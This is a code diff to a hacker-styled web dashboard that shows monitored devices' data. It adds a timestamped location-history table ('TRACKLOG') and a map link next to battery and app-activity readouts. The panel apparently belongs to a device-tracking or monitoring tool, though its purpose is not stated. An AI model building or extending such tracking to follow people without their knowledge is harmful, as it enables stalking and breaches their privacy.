@@ -604,10 +604,11 @@
                             if (mod === 'location') {
                                 const loc = s.location_fresh || (s.location_history?.[0]);
                                 if (loc) {
-                                    preview = `${loc.lat.toFixed(4)}, ${loc.lon.toFixed(4)}`;
                                     const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lon}`;
-                                    preview = `<a href="${mapUrl}" target="_blank" style="color:var(--success); text-decoration:none;">📍 VIEW ON MAP</a>`;
+                                    preview = `<a href="${mapUrl}" target="_blank" style="color:var(--success); text-decoration:none; font-weight:bold;">📍 MAP LINK</a>`;
                                 } else preview = "NO_SIGNAL";
+                                const history = s.location_history || [];
+                                fullData = s.location_fresh ? [s.location_fresh, ...history] : history;
                             } else if (mod === 'vitals') {
                                 preview = `BATT: ${s.battery_level}% | SESSIONS: ${s.online_sessions}`;
                                 fullData = { battery: s.battery_level, online_mins: s.online_time_minutes, health: s.app_health };
@@ -631,8 +632,22 @@
                                             ${hasData ? `<span style="color:var(--primary); font-size:0.5rem; opacity:0.5;">▼</span>` : ''}
                                         </div>
                                     </div>
-                                    <div id="${divId}" style="display:none; margin-top:10px; max-height:250px; overflow:auto; background:#050505; padding:8px; border:1px solid #333; pointer-events: auto;" onclick="event.stopPropagation()">
-                                        <pre style="font-size:0.6rem; color:var(--success); margin:0; white-space:pre-wrap; font-family: 'Share Tech Mono', monospace;">${JSON.stringify(fullData, null, 2)}</pre>
+                                    <div id="${divId}" style="display:none; margin-top:10px; max-height:300px; overflow:auto; background:#050505; padding:8px; border:1px solid #333; pointer-events: auto;" onclick="event.stopPropagation()">
+                                        ${mod === 'location' && Array.isArray(fullData) ? `
+                                            <table style="width:100%; border-collapse:collapse; font-size:0.6rem; color:var(--success);">
+                                                <tr style="border-bottom:1px solid #444; color:#888; text-align:left;">
+                                                    <th style="padding:4px;">TIME</th><th style="padding:4px;">COORD</th><th style="padding:4px; text-align:right;">ACC</th>
+                                                </tr>
+                                                ${fullData.map(l => `
+                                                    <tr style="border-bottom:1px solid #222;">
+                                                        <td style="padding:4px; white-space:nowrap;">${new Date(l.ts).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})}</td>
+                                                        <td style="padding:4px; font-family:monospace;">${l.lat.toFixed(5)}, ${l.lon.toFixed(5)}</td>
+                                                        <td style="padding:4px; text-align:right; color:#888;">±${Math.round(l.acc)}m</td>
+                                                    </tr>
+                                                `).join('')}
+                                            </table>
+                                            <div style="margin-top:10px; font-size:0.55rem; color:#444; text-align:center;">END OF TRACKLOG</div>
+                                        ` : `<pre style="font-size:0.6rem; color:var(--success); margin:0; white-space:pre-wrap; font-family: 'Share Tech Mono', monospace;">${JSON.stringify(fullData, null, 2)}</pre>`}
                                     </div>
                                 </div>`;
                         });
